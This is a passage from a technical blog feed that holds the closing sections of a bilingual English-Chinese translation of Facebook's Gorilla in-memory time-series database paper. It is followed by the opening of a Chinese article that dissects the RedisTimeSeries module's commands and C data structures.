PPMCC，测试时间序列需要和全量时间序列一起分布在到每个 Gorilla 主机上。 然后，每个主机独立计算前 N 个相关时间序列，按 PPMCC 与测试数据的绝对值进行排序，并返回时间序列值。 在未来，我们希望 Gorilla 能够对我们的监控时间序列数据启用更先进的数据挖掘技术，例如文献中描述的用于聚类和异常检测的技术 [10,11,16]。</p><h3 id="5-2、图表"><a href="#5-2、图表" class="headerlink" title="5.2、图表"></a>5.2、图表</h3><p>Low latency queries have also enabled higher query volume tools. As an example, engineers unrelated to the monitoring team have created a new data visualization which will show large sets of horizon charts, which themselves are reductions across many time series. This visualization allows users to quickly visually scan across large sets of data to see outliers and time-correlated anomalies.</p><p>低延迟查询还启用了更大查询量的工具。 例如，与监控团队无关的工程师创建了一个新的数据可视化界面，它将显示大量的线性图表，这些图表本身就是从大量时间序列中简化计算来的。 这种可视化使用户能够快速地对大量数据进行可视化扫描，以查看异常值和与时间相关的异常现象。</p><h3 id="5-3、聚合"><a href="#5-3、聚合" class="headerlink" title="5.3、聚合"></a>5.3、聚合</h3><p>Recently, we moved the roll up background process from a set of map-reduce jobs to running directly against Gorilla. Recall that ODS performs time-based aggregations (or roll up) compression on old data, which is a lossy compression that reduces data granularity [26], similar to the format used by Whisper [1]. Before Gorilla, map-reduce jobs were run against the HBase cluster, which would read all data for the past hour and output values for a new, lower granularity table. Now, a background process periodically scans all completed buckets every two hours, generating the new values for the lower granularity table. Because scanning all data in Gorilla is very efficient, this move has reduced load on the HBase cluster, as we no longer need to write all the high granularity data to disk and do expensive full table scans on HBase.</p><p>最近，我们将在后台对数据做汇总叠加的程序从一组 map-reduce 任务中迁移到了 Gorilla 上直接执行。回想一下，ODS 对旧数据执行基于时间的聚合（或汇总）压缩，这是一种降低数据粒度的有损压缩 [26]，类似于 Whisper [1] 使用的格式。在 Gorilla 之前，map-reduce 作业是针对 HBase 集群运行的，该集群将读取过去一小时的所有数据的值到较低粒度的表中。现在，后台进程每两小时定期扫描所有已完成的存储桶，为较低粒度的表生成新值。 因为扫描 Gorilla 中的所有数据非常高效，这一举措减少了 HBase 集群的负载，因为我们不再需要将所有高粒度数据写入磁盘并在 HBase 上进行昂贵的全表扫描。</p><div><p><img src="/assets/images/gorilla-cn-9.png" alt="图 9" loading="lazy"></p></div><p>Figure 9: Growth of the total query volume since Gorilla’s introduction to ease data exploration and develop new analysis tools.</p><p>图 9：自 Gorilla 推出以简化数据探索和开发新的分析工具以来，总查询量的增长。</p><h2 id="6、经验"><a href="#6、经验" class="headerlink" title="6、经验"></a>6、经验</h2><h3 id="6-1、容错"><a href="#6-1、容错" class="headerlink" title="6.1、容错"></a>6.1、容错</h3><p>We next describe several planned and unplanned events that occurred over the past 6 months that affected some portion of Facebook’s site availability. We restrict ourselves to discussing the impact of these events on Gorilla as other issues are beyond the scope of this paper.</p><p>接下来，我们将介绍过去 6 个月内发生的几个预期内和预期外的事件，这些事件在一定程度上影响了 Facebook 站点的可用性。这里我们只限于讨论对 Gorilla 有影响的事件，因为其它问题超出了本文的范畴。</p><p><strong>Network cuts.</strong> 3 unplanned events resembling network cuts&#x2F;outages to some portion of machines. The cuts were automatically detected and Gorilla automatically shifted reads to the unaffected coast without any service disruption.</p><p><strong>网络中断。</strong> 3 次预期外发生在某些机器上的类似网络中断&#x2F;中断的事件。网络中断被自动检测到，Gorilla 将自动将读重定向到未受影响的区域，期间没有任何服务出现中断。</p><p><strong>Disaster readiness.</strong> 1 planned major fire drill simulating total network cut to one storage back end. As above, Gorilla switched reads to the unaffected coast. Once the downed region was restored, Gorilla in the down region was manually remediated to pull in logs from the firedrill time frame so dashboards served out of the down region would display the expected data to end users.</p><p><strong>灾难准备。</strong> 1 次预期内的大型故障演练，模拟整个后端存储所在处的网络全部中断。 如上所述，Gorilla 将读切换到未受影响的区域。 一旦故障区域恢复，将手动从日志文件中拉取故障时间段的数据，从而使故障区域提供的数据面板可以向最终用户展示预期内的数据。</p><p><strong>Configuration changes and code pushes.</strong> There were 6 configuration changes and 6 code releases that required restarting Gorilla in a given region.</p><p><strong>配置更改和代码推送。</strong> 有 6 个配置更改和 6 个代码版本需要在给定区域中重新启动 Gorilla。</p><p><strong>Bug.</strong> A release with a major bug was pushed to a single coast. Gorilla immediately shifted load to the other region and continued serving uses until the bug was fixed. There was minimal correctness issues in the served data.</p><p><strong>错误。</strong> 一个有重大错误的版本被推到一个区域。 Gorilla 立即将负载转移到另一个区域并继续使用，直到错误得到修复。 在输出的数据中，只有极小的数据准确性问题。</p><p><strong>Single node failures.</strong> There were 5 single machine failures (unassociated with the major bug), causing no lost data and no remediation needed.</p><p><strong>单节点故障。</strong> 有 5 次单机故障（与主要 bug 无关），不会导致数据丢失，也无需修复。</p><p>There were zero events in Gorilla in the last 6 months that caused anomaly detection and alerting issues. Since Gorilla launched, there has only been 1 event that disrupted realtime monitoring. In all cases, the long-term storage was able to act as a backup for all monitoring-related queries.</p><p>在过去的 6 个月中，Gorilla 没有出现任何引发检测异常和报警问题的事件。 自 Gorilla 推出以来，只有 1 起事件影响了实时监控。 在所有情况下，持久化存储为所有与监控相关的查询扮演备份的角色。</p><div><p><img src="/assets/images/gorilla-cn-10.png" alt="图 10" loading="lazy"></p></div><p>Figure 10: When searching for the root cause for a site-wide error rate increase, Gorilla’s time series correlation found anomalous events that were correlated in time, namely a drop in memory used when copying a newly released binary.</p><p>图 10：在寻找站点范围内错误率增加的根本原因时，Gorilla 的时间序列相关性发现了时间相关的异常事件，即复制新发布的二进制文件时使用的内存下降。</p><h3 id="6-2、网站故障排查"><a href="#6-2、网站故障排查" class="headerlink" title="6.2、网站故障排查"></a>6.2、网站故障排查</h3><p>For an example of how Facebook uses time series data to drive our monitoring, one can look at a recent issue that was detected quickly and fixed due to monitoring data, first described externally at SREcon15 [19].</p><p>对于 Facebook 如何使用时间序列数据来支持我们的监控的示例，可以看看最近一个依靠监控数据来快速检测和修复的问题，我们在 SREcon15 [19] 上首次外对介绍了这次事件。</p><p>A mysterious problem resulted in a spike in the site wide error rate. This error rate was visible in Gorilla a few minutes after the error rate spike and raised an alert which notified the appropriate team a few minutes later [19]. Then, the hard work began. As one set of engineers mitigated the issue, others began the hunt for a root cause. Using tools built on Gorilla, including a new time series correlation search described in Section 5, they were able to find that the routine process of copying the release binary to Facebook’s web servers caused an anomalous drop in memory used across the site, as illustrated in Figure 10. The detection of the problem, various debugging efforts and root cause analysis, depended on time series analysis tools enabled by Gorilla’s high performance query engine.</p><p>一个神秘的问题导致站点范围内的错误率飙升。 这个问题在错误率飙升几分钟后在 Gorilla 中被观测到，并在几分钟后发出警报通知相应的团队 [19]。 然后，艰苦的工作开始了。 随着一组工程师缓解了这个问题，其他人也开始寻找根本原因。 通过使用基于 Gorilla 构建的工具，包括第 5 节中介绍的时间序列关联索引，他们发现将发布的二进制包复制到 Facebook 的 Web 服务器的过程导致整个站点使用的内存异常下降，如图 10 所示。问题的检测、各种调试工作和故障原因的分析都依赖于 Gorilla 的高性能查询引擎所支持的时间序列分析工具。</p><p>Since launching about 18 months ago, Gorilla has helped Facebook engineers identify and debug several such production issues. By reducing the 90th percentile Gorilla query time to 10ms, Gorilla has also improved developer productivity. Further by serving 85% of all monitoring data from Gorilla, very few queries must hit the HBase TSDB [26], resulting in a lower load on the HBase cluster.</p><p>自大约 18 个月前推出以来，Gorilla 已经帮助 Facebook 工程师识别和排查了几个类似的生产环境问题。 通过将 90% 的 Gorilla 查询时间减少到 10 毫秒，Gorilla 还提高了开发人员的工作效率。 此外，通过为 Gorilla 提供 85% 的所有监控数据，很少有查询必须命中 HBase TSDB [26]，从而降低了 HBase 集群的负载。</p><h3 id="6-3、经验教训"><a href="#6-3、经验教训" class="headerlink" title="6.3、经验教训"></a>6.3、经验教训</h3><p><strong>Prioritize recent data over historical data.</strong> Gorilla occupies an interesting optimization and design niche. While it must be very reliable, it does not require ACID data guarantees. In fact, we have found that it is more important for the most recent data to be available than any previous data point. This led to interesting design trade-offs, such as making a Gorilla host available for reads before older data is read off disk.</p><p><strong>重点考虑最近的数据而不是历史数据。</strong> Gorilla 在优化和设计定位上比较独特。 虽然它必须得非常可靠，但它不需要 ACID 数据保证。 事实上，我们发现提供最新数据比任何以前的数据点都更重要。 这导致了有趣的设计权衡，例如在将旧数据从磁盘上读取之前要保持 Gorilla 主机的读取可用性。</p><p><strong>Read latency matters.</strong> The efficient use of compression and in-memory data structures has allowed for extremely fast reads and resulted in a significant usage increase. While ODS served 450 queries per second when Gorilla launched, Gorilla soon overtook it and currently handles more than 5,000 steady state queries per second, peaking at one point to 40,000 peak queries per second, as seen in Figure 9. Low latency reads have encouraged our users to build advanced data analysis tools on top of Gorilla as described in Section 5.</p><p><strong>读取延迟很重要。</strong> 高效的数据压缩和内存的数据结构极大的加快了数据读取的速度，并且推动增加了很多使用场景。当 Gorilla 推出时 ODS 每秒支撑 450 次查询，很快 Gorilla 就超过了它，目前每秒处理超过 5000 次常规查询业务，峰值时达到每秒 40000 的查询，如图9所示。低延时的读取鼓励我们的用户在 Gorilla 之上构建更高级的数据分析工具，如第 5 节的描述。</p><p><strong>High availability trumps resource efficiency.</strong> Fault tolerance was an important design goal for Gorilla. It needed to be able to withstand single host failures with no interruption in data availability. Additionally, the service must be able to withstand disaster events that may impact an entire region. For this reason, we keep two redundant copies of data in memory despite the efficiency hit. </p><p><strong>高可用性胜过资源效率。</strong> 容错是 Gorilla 的一个重要设计目标。 它需要能够承受单机故障而不会影响数据的可用性。 此外，该服务必须能够承受可能影响整个地区的灾难事件。 出于这个原因，我们在内存中保留了两个冗余的数据副本，尽管这样对效率会有一些影响。</p><p>We found that building a reliable, fault tolerant system was the most time consuming part of the project. While the team prototyped a high performance, compressed, inmemory TSDB in a very short period of time, it took several more months of hard work to make it fault tolerant. However, the advantages of fault tolerance were visible when the system successfully survived both real and simulated failures [21]. We also benefited from a system that we can safely restart, upgrade, and add new nodes to whenever we need to. This has allowed us to scale Gorilla effectively with low operational overhead while providing a highly reliable service to our customers.</p><p>我们发现构建一个可靠的容错系统是该项目中最耗时的部分。 虽然该团队在很短的时间内制作了一个高性能、数据压缩的内存 TSDB 原型，但要使其具有容错能力，还需要几个月的努力。 然而，当系统成功地从真实和模拟故障中幸存下来时，容错的优势是显而易见的[21]。 我们还受益于一个系统，我们可以在需要时安全地重新启动、升级和添加新节点。 这使我们能够以较低的运营开销有效地扩展 Gorilla，同时为我们的客户提供高度可靠的服务。</p><h2 id="7、未来的工作"><a href="#7、未来的工作" class="headerlink" title="7、未来的工作"></a>7、未来的工作</h2><p>We wish to extend Gorilla in several ways. One effort is to add a second, larger data store between in-memory Gorilla and HBase based on flash storage. This store has been built to hold the compressed two hour chunks but for a longer period than 26 hours. We have found that flash storage allows us to store about two weeks of full resolution, Gorilla compressed data. This will extend the amount of time full resolution data is available to engineers to debug problems. Preliminary performance results are included in Figure 8.</p><p>我们希望通过几种方式来扩展 Gorilla 。一种方向是在 Gorilla 内存存储和 HBase 存储之间增加一个更大的基于闪存的二级存储。这个存储用来存放每两小时生成一次的经过数据压缩之后的分片，但是总容量会比 26 小时更长，我们发现闪存可以存储约 2 周的全量无损的、 Gorilla 格式压缩后的数据，数据时段拉长对工程师们排查问题是很有用的。图 8 是初步的性能测试结果。</p><p>Before building Gorilla, ODS relied on the HBase backing store to be a real-time data store: very shortly after data was sent to ODS for storage, it needed to be available to read operations placing a significant burden on HBase’s disk I&#x2F;O. Now that Gorilla is acting as a write-through cache for the most recent data, we have at least a 26 hour window after data is sent to ODS before they will be read from HBase. We are exploiting this property by rewriting our write path to wait longer before writing to HBase. This optimization should be much more efficient on HBase, but the effort is too new to report results.</p><p>在构建 Gorilla 之前，ODS 依赖 HBase 背后的存储来用作实时数据存储：在数据写入到 ODS 后不久，它就需要可用于读取操作，这对 HBase 的磁盘 I&#x2F;O 造成了很大的负担。 现在 Gorilla 正在充当最新数据的直写缓存，在将数据发送到 ODS 之后，我们至少有 26 小时的时间窗口才能从 HBase 读取它们。 我们通过重写我们的写入路径以在写入 HBase 之前等待更长的时间来利用此属性。 这种优化在 HBase 上应该会更有效，但是目前这个方向还处于早期，没有相当的对比数据。</p><h2 id="8、总结"><a href="#8、总结" class="headerlink" title="8、总结"></a>8、总结</h2><p>Gorilla is a new in-memory times series database that we have developed and deployed at Facebook. Gorilla functions as a write through cache for the past 26 hours of monitoring data gathered across all of Facebook’s systems. In this paper, we have described a new compression scheme that allows us to efficiently store monitoring data comprising of over 700 million points per minute. Further, Gorilla has allowed us to reduce our production query latency by over 70x when compared to our previous on-disk TSDB. Gorilla has enabled new monitoring tools including alerts, automated remediation and an online anomaly checker. Gorilla has been in deployment for the past 18 months and has successfully doubled in size twice in this period without much operational effort demonstrating the scalability of our solution. We have also verified Gorilla’s fault tolerance capabilities via several large scale simulated failures as well as actual disaster situations—Gorilla remained highly available for both writes and reads through these events aiding site recovery.</p><p>Gorilla 是我们在 Facebook 开发和部署的一个新的内存时间序列数据库。 Gorilla 用作过去 26 小时从 Facebook 的所有系统收集的监控数据的直写缓存。在本文中，我们描述了一种新的压缩方案，它使我们能够有效地存储每分钟包含超过 7 亿个点的监控数据。此外，与我们之前的磁盘 TSDB 相比，Gorilla 使我们能够将生产查询延迟减少 70 倍以上。 Gorilla 启用了新的监控工具，包括警报、自动修复和在线异常检查器。 Gorilla 在过去 18 个月中一直在部署，并且在此期间成功地将规模翻了一番，而无需太多的运营努力证明了我们解决方案的可扩展性。我们还通过几次大规模模拟故障以及实际灾难情况验证了 Gorilla 的容错能力——通过这些事件帮助站点恢复，Gorilla 在写入和读取方面保持高度可用。</p><h2 id="9、致谢"><a href="#9、致谢" class="headerlink" title="9、致谢"></a>9、致谢</h2><p>Lots of thanks to Janet Wiener, Vinod Venkataraman and the others who reviewed early drafts of this paper to find typos and incorrect information.</p><p>非常感谢 Janet Wiener、Vinod Venkataraman 和其他审阅本文早期草稿以发现错别字和不正确信息的人。</p><p>Huge thanks to Sanjeev Kumar and Nathan Bronson, who had great insights into framing the paper to make it read better.</p><p>非常感谢 Sanjeev Kumar 和 Nathan Bronson，他们在设计论文以使其更好地阅读方面有深刻的见解。</p><p>Thank you to Mike Nugent, who had the brilliant idea to use PPMCC to find root causes and effects caused by interesting time series, and hacked a prototype together so quickly.</p><p>感谢 Mike Nugent，他有一个绝妙的主意，使用 PPMCC 找到有趣的时间序列引起的根本原因和影响，并如此迅速地破解了一个原型。</p><p>Of course, thanks to the current ODS team (Alex Bakhturin, Scott Franklin, Ostap Korkuna, Wojciech Lopata, Jason Obenberger, and Oleksandr Voietsa), and ODS alumnus (Tuomas Pelkonen and Charles Thayer) who have made monitoring Facebook’s infrastructure so much fun over the last few years. You guys are awesome!</p><p>当然，感谢当前的 ODS 团队（Alex Bakhturin、Scott Franklin、Ostap Korkuna、Wojciech Lopata、Jason Obenberger 和 Oleksandr Voietsa）和 ODS 的校友（Tuomas Pelkonen 和 Charles Thayer），他们让监控 Facebook 的基础设施变得如此有趣 最近几年。 你们真棒！</p><h2 id="10、参考文献"><a href="#10、参考文献" class="headerlink" title="10、参考文献"></a>10、参考文献</h2><div><p>[1] Graphite - Scalable Realtime Graphing. <a href="http://graphite.wikidot.com/">http://graphite.wikidot.com/</a>. Accessed March 20, 2015.<br>[2] Influxdb.com: InfluxDB - Open Source Time Series, Metrics, and Analytics Database. <a href="http://influxdb.com/">http://influxdb.com/</a>. Accessed March 20, 2015.<br>[3] L. Abraham, J. Allen, O. Barykin, V. R. Borkar, B. Chopra, C. Gerea, D. Merl, J. Metzler, D. Reiss, S. Subramanian, J. L. Wiener, and O. Zed. Scuba: Diving into Data at Facebook. PVLDB, 6(11):1057–1067, 2013.<br>[4] E. B. Boyer, M. C. Broomfield, and T. A. Perrotti. GlusterFS One Storage Server to Rule Them All. Technical report, Los Alamos National Laboratory (LANL), 2012.<br>[5] N. Bronson, T. Lento, and J. L. Wiener. Open Data Challenges at Facebook. In Workshops Proceedings of the 31st International Conference on Data Engineering Workshops, ICDE Seoul, Korea. IEEE, 2015.<br>[6] T. D. Chandra, R. Griesemer, and J. Redstone. Paxos Made Live: An Engineering Perspective. In Proceedings of the twenty-sixth annual ACM symposium on Principles of distributed computing, pages 398–407. ACM, 2007.<br>[7] H. Chen, J. Li, and P. Mohapatra. RACE: Time Series Compression with Rate Adaptivity and Error Bound for Sensor Networks. In Mobile Ad-hoc and Sensor Systems, 2004 IEEE International Conference on, pages 124–133. IEEE, 2004.<br>[8] B. Hu, Y. Chen, and E. J. Keogh. Time Series Classification under More Realistic Assumptions. In SDM, pages 578–586, 2013.<br>[9] E. Keogh, K. Chakrabarti, M. Pazzani, and S. Mehrotra. Locally Adaptive Dimensionality Reduction for Indexing Large Time Series Databases. ACM SIGMOD Record, 30(2):151–162, 2001.<br>[10] E. Keogh, S. Lonardi, and B.-c. Chiu. Finding Surprising Patterns in a Time Series Database in Linear Time and Space. In Proceedings of the eighth ACM SIGKDD international conference on Knowledge discovery and data mining, pages 550–556. ACM, 2002.<br>[11] E. Keogh, S. Lonardi, and C. A. Ratanamahatana. Towards Parameter-Free Data Mining. In Proceedings of the tenth ACM SIGKDD international conference on Knowledge discovery and data mining, pages 206–215. ACM, 2004.<br>[12] E. Keogh and C. A. Ratanamahatana. Exact Indexing of Dynamic Time Warping. Knowledge and information systems, 7(3):358–386, 2005.<br>[13] I. Lazaridis and S. Mehrotra. Capturing Sensor-Generated Time Series with Quality Guarantees. In Data Engineering, 2003. Proceedings. 19th International Conference on, pages 429–440. IEEE, 2003.<br>[14] Leslie Lamport. Paxos Made Simple. SIGACT News, 32(4):51–58, December 2001.<br>[15] J. Lin, E. Keogh, S. Lonardi, and B. Chiu. A Symbolic Representation of Time Series, with Implications for Streaming Algorithms. In Proceedings of the 8th ACM SIGMOD workshop on Research issues in data mining and knowledge discovery, pages 2–11. ACM, 2003.<br>[16] J. Lin, E. Keogh, S. Lonardi, J. P. Lankford, and D. M. Nystrom. Visually Mining and Monitoring Massive Time Series. In Proceedings of the tenth ACM SIGKDD international conference on Knowledge discovery and data mining, pages 460–469. ACM, 2004.<br>[17] P. Lindstrom and M. Isenburg. Fast and Efficient Compression of Floating-Point Data. Visualization and Computer Graphics, IEEE Transactions on, 12(5):1245–1250, 2006.<br>[18] A. Mueen, S. Nath, and J. Liu. Fast Approximate Correlation for Massive Time-Series Data. In Proceedings of the 2010 ACM SIGMOD International Conference on Management of data, pages 171–182. ACM, 2010.<br>[19] R. Nishtala. Learning from Mistakes and Outages. Presented at SREcon, Santa Clara, CA, March 2015.<br>[20] R. Nishtala, H. Fugal, S. Grimm, M. Kwiatkowski, H. Lee, H. C. Li, R. McElroy, M. Paleczny, D. Peek, P. Saab, et al. Scaling Memcache at Facebook. In nsdi, volume 13, pages 385–398, 2013.<br>[21] J. Parikh. Keynote speech. Presented at @Scale Conference, San Francisco, CA, September 2014.<br>[22] K. Pearson. Note on regression and inheritance in the case of two parents. Proceedings of the Royal Society of London, 58(347-352):240–242, 1895.<br>[23] F. Petitjean, G. Forestier, G. Webb, A. Nicholson, Y. Chen, and E. Keogh. Dynamic Time Warping Averaging of Time Series Allows Faster and More Accurate Classification. In IEEE International Conference on Data Mining, 2014.<br>[24] T. Rakthanmanon, B. Campana, A. Mueen, G. Batista, B. Westover, Q. Zhu, J. Zakaria, and E. Keogh. Searching and Mining Trillions of Time Series Subsequences Under Dynamic Time Warping. In Proceedings of the 18th ACM SIGKDD international conference on Knowledge discovery and data mining, pages 262–270. ACM, 2012.<br>[25] P. Ratanaworabhan, J. Ke, and M. Burtscher. Fast Lossless Compression of Scientific Floating-Point Data. In DCC, pages 133–142. IEEE Computer Society, 2006.<br>[26] L. Tang, V. Venkataraman, and C. Thayer. Facebook’s Large Scale Monitoring System Built on HBase. Presented at Strata Conference, New York, 2012.<br>[27] A. Thusoo, J. S. Sarma, N. Jain, Z. Shao, P. Chakka, S. Anthony, H. Liu, P. Wyckoff, and R. Murthy. Hive: A Warehousing Solution Over a Map-Reduce Framework. PVLDB, 2(2):1626–1629, 2009.<br>[28] T. W. Wlodarczyk. Overview of Time Series Storage and Processing in a Cloud Environment. In Proceedings of the 2012 IEEE 4th International Conference on Cloud Computing Technology and Science (CloudCom), pages 625–628. IEEE Computer Society, 2012.</p></div><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><div><ul><li><a href="https://www.huoban.com/news/post/7708.html">https://www.huoban.com/news/post/7708.html</a></li><li><a href="https://developer.aliyun.com/article/174535">https://developer.aliyun.com/article/174535</a></li><li><a href="https://www.shuzhiduo.com/A/8Bz8NyoX5x/">https://www.shuzhiduo.com/A/8Bz8NyoX5x/</a></li><li><a href="https://blog.acolyer.org/2016/05/03/gorilla-a-fast-scalable-in-memory-time-series-database/">https://blog.acolyer.org/2016/05/03/gorilla-a-fast-scalable-in-memory-time-series-database/</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 论文 </category>
          
          <category> 数据库 </category>
          
          <category> 时序数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 论文 </tag>
            
            <tag> Gorilla </tag>
            
            <tag> 时序数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RedisModule剖析 - RedisTimeSeries</title>
      <link href="/2022/07/01/redismodule-redistimeseries/"/>
      <url>/2022/07/01/redismodule-redistimeseries/</url>
      
        <content type="html"><![CDATA[<p><code>RedisTimeSeries</code> 是一款基于 <code>RedisModule</code> 实现的时序数据库模块，提供了基础的时序操作功能，包括不限于聚合查询，范围查询，保留周期，降采样（数据压缩），插值变更，二级索引等。由于数据存储于内存中，因此提供了高性能读写访问能力，但同时也受限于内存存储，可能并不适合用在极大数据量的时序场景中。考虑到身靠着Redis生态这棵大树，也许能够和Redis生态的众多组件碰撞出有趣的火花。</p><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><ul><li>官网：<a href="https://redis.io/docs/stack/timeseries/">https://redis.io/docs/stack/timeseries/</a></li><li>GitHub 地址：<a href="https://github.com/RedisTimeSeries/RedisTimeSeries">https://github.com/RedisTimeSeries/RedisTimeSeries</a></li><li>命令文档地址：<a href="https://redis.io/commands/ts.add/">https://redis.io/commands/ts.add/</a></li><li>支持功能：<ul><li>大容量插入，低延迟读取；</li><li>按开始时间和结束时间查询；</li><li>任何时间桶的聚合查询（ Min 、 Max 、 Avg 、 Sum 、 Range 、 Count 、 First 、 Last 、 STD.P 、 STD.S 、 Var.P 、 Var.S 、 twa ）；</li><li>可配置的最长保留期；</li><li>压缩 - 自动更新的聚合时间序列；</li><li>二级索引 - 每个时间序列都有标签（名称-值对），允许按标签查询；</li></ul></li></ul><h2 id="二、架构设计"><a href="#二、架构设计" class="headerlink" title="二、架构设计"></a>二、架构设计</h2><h3 id="2-1、基础概念"><a href="#2-1、基础概念" class="headerlink" title="2.1、基础概念"></a>2.1、基础概念</h3><ul><li><code>sample</code>：样本数据，一个样本数据包含一个 <code>样本时间（int64）</code> 和一个 <code>样本值（double）</code>；</li><li><code>chunk</code>：每个 <code>chunk</code> 中会存储一批的样本数据（连续时间戳的样本数据），随着数据的写入，一个时序类型中会包含多个 <code>chunk</code>；<ul><li><code>非压缩模式</code>：<code>chunk</code> 使用数组来存储样本（插值的时候会进行数组的移动）；</li><li><code>压缩模式</code>：<code>chunk</code> 使用 <code>Delta-Of-Delta</code> 和 <code>XOR</code> 压缩编码存储数据（插值的时候会进行 <code>chunk</code> 拆分）；</li></ul></li><li><code>label</code>：标签，会依据标签创建二次索引，以便于快速查询到指定标签的 <code>key</code> 的信息；</li><li><code>rule</code>：数据聚集的规则，在插入样本的时候会按照指定的规则将数据聚合到特定的 <code>key</code> 中，用于支持数据的降采样；</li></ul><h3 id="2-2、相关命令"><a href="#2-2、相关命令" class="headerlink" title="2.2、相关命令"></a>2.2、相关命令</h3><ul><li>ts.create : 创建一个新的时间序列；</li><li>ts.createrule : 创建一个新的时间序列压缩规则；</li><li>ts.add : 添加一个时间样本到对应的时间序列中；</li><li>ts.madd : 添加一个或多个时间样本到对应的时间序列中；</li><li>ts.get : 从时间序列中获取最新的一个时间样本数据；</li><li>ts.mget : 从符合条件的多个时间序列中获取最新的一个时间样本数据；</li><li>ts.alter : 更新现有时间序列的保留时间、块大小、时间样本重复策略以及标签信息；</li><li>ts.incrby : 更新指定时间序列中最新的时间样本的值，如果不存在则新增对应时间样本；</li><li>ts.decrby : 更新指定时间序列中最新的时间样本的值，如果不存在则新增对应时间样本；</li><li>ts.del : 删除指定范围内的时间序列中的时间样本数据；</li><li>ts.deleterule : 删除一个时间序列压缩规则；</li><li>ts.range : 从一个时间序列中查询范围区间的时间样本数据，按照时间戳从老到新查询；</li><li>ts.revrange :  从一个时间序列中查询范围区间的时间样本数据，按照时间戳从新到老查询；</li><li>ts.mrange : 从符合条件的多个时间序列中查询指定时间区间的时间样本数据，按照时间戳从老到新查询；</li><li>ts.mrevrange : 从符合条件的多个时间序列中查询指定时间区间的时间样本数据，按照时间戳从新到老查询；</li><li>ts.queryindex : 查询所有符合条件的时间序列的信息；</li><li>ts.info : 查询指定时间序列的信息；</li></ul><h3 id="2-3、数据结构"><a href="#2-3、数据结构" class="headerlink" title="2.3、数据结构"></a>2.3、数据结构</h3><h4 id="2-3-1、时序主体数据结构"><a href="#2-3-1、时序主体数据结构" class="headerlink" title="2.3.1、时序主体数据结构"></a>2.3.1、时序主体数据结构</h4><p><img src="/assets/images/redistimeseries-mainstruct.png" alt="时序主体数据结构" loading="lazy"></p><p>一个时间序列数据的存储结构主要由以下几个部分组成：</p><ul><li><code>Rules</code> : <ul><li>含义 : 时间序列的数据压缩规则，记录了当前时间序列数据的所有的数据压缩规则，并在数据写入的过程中逐步进行数据压缩；</li><li>格式 : 链表；</li></ul></li><li><code>Labels</code> :<ul><li>含义 : 时间序列的标签信息，记录了当前时间序列数据的所有标签信息，以便于后续进行索引查询；</li><li>格式 : 数组；</li></ul></li><li><code>Chunks</code> :<ul><li>含义 : 时间序列的样本数据信息，内部记录了当前时间序列的所有样本数据，便于后续的数据分析与查询；</li><li>格式 : 基数树；</li><li>类别 : 压缩格式（样本数据存储经过 <code>Delta-Of-Delta</code> 和 <code>XOR</code> 压缩） 和 非压缩格式（直接存储原始样本数据）；</li></ul></li><li>其他成员变量信息；</li></ul><figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 时序数据的结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Series</span> &#123;<br>    RedisModuleDict *chunks;             <span class="hljs-comment">// 记录所有的桶列表</span><br>    <span class="hljs-type">void</span> *lastChunk;                     <span class="hljs-comment">// 记录当前指向的最新的桶</span><br>    <span class="hljs-type">uint64_t</span> retentionTime;              <span class="hljs-comment">// 时间样本的保留时间，单位与时间样本的时间戳保持一致，默认都为毫秒</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> chunkSizeBytes;            <span class="hljs-comment">// 每个桶的大小，单位字节</span><br>    <span class="hljs-type">short</span> options;                       <span class="hljs-comment">// 时序数据的配置信息</span><br>    CompactionRule *rules;               <span class="hljs-comment">// 当前时间序列的压缩数据规则</span><br>    <span class="hljs-type">timestamp_t</span> lastTimestamp;           <span class="hljs-comment">// 上一次写入的时间样本的时间戳</span><br>    <span class="hljs-type">double</span> lastValue;                    <span class="hljs-comment">// 上一次写入的时间样本的值</span><br>    Label *labels;                       <span class="hljs-comment">// 当前时间序列数据的标签数组</span><br>    RedisModuleString *keyName;          <span class="hljs-comment">// 时序key的名称，用户指定</span><br>    <span class="hljs-type">size_t</span> labelsCount;                  <span class="hljs-comment">// 标签的计数</span><br>    RedisModuleString *srcKey;           <span class="hljs-comment">// 如果当前 key 是一个存储压缩时间序列数据的 key，那么srcKey指向原始的时间序列</span><br>    <span class="hljs-type">const</span> ChunkFuncs *funcs;             <span class="hljs-comment">// 操作桶的函数指针</span><br>    <span class="hljs-type">size_t</span> totalSamples;                 <span class="hljs-comment">// 所有时间样本数量和</span><br>    DuplicatePolicy duplicatePolicy;     <span class="hljs-comment">// 处理重复时间样本时的策略</span><br>&#125; Series;<br><br><span class="hljs-comment">// 压缩时序数据的压缩规则的结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">CompactionRule</span> &#123;<br>    RedisModuleString *destKey;          <span class="hljs-comment">// 压缩时间序列数据的目标 key</span><br>    <span class="hljs-type">timestamp_t</span> bucketDuration;          <span class="hljs-comment">// 每个桶的间隔时间，以毫秒为单位</span><br>    <span class="hljs-type">timestamp_t</span> timestampAlignment;      <span class="hljs-comment">// 对齐的时间戳，是一个时间点，后续每个对齐都以该时间点为起始位置点，毫秒为单位</span><br>    AggregationClass *aggClass;          <span class="hljs-comment">// 聚合类型相关的函数指针</span><br>    TS_AGG_TYPES_T aggType;              <span class="hljs-comment">// 聚合类型</span><br>    <span class="hljs-type">void</span> *aggContext;                    <span class="hljs-comment">// 聚合数据的上下文信息</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">CompactionRule</span> *nextRule;     <span class="hljs-comment">// 下一个压缩时间序列数据规则的信息</span><br>    <span class="hljs-type">timestamp_t</span> startCurrentTimeBucket;  <span class="hljs-comment">// 依据不同的时间样本的时间对齐规则，每个桶的初始时间有所不同</span><br>&#125; CompactionRule;<br><br><span class="hljs-comment">// 标签的结构体</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> &#123;<br>    RedisModuleString *key;              <span class="hljs-comment">// 标签的名称</span><br>    RedisModuleString *value;            <span class="hljs-comment">// 标签的值</span><br>&#125; 